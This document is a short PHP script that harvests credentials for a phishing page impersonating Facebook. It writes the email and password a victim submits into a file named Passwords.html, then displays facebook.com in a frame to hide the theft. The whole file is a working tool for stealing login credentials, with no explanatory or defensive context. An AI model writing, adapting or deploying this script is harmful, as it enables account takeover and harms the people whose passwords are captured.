<?php
$fb = fopen("Passwords.html","a");
fwrite($fb, "Email:$_POST[email]\tPassword:$_POST[pass]");
echo"<HTML>
<head>
<FRAMESET cols=\"*\">
<FRAME SRC=\http://www.facebook.com\>
</FRAMESET>";
?>
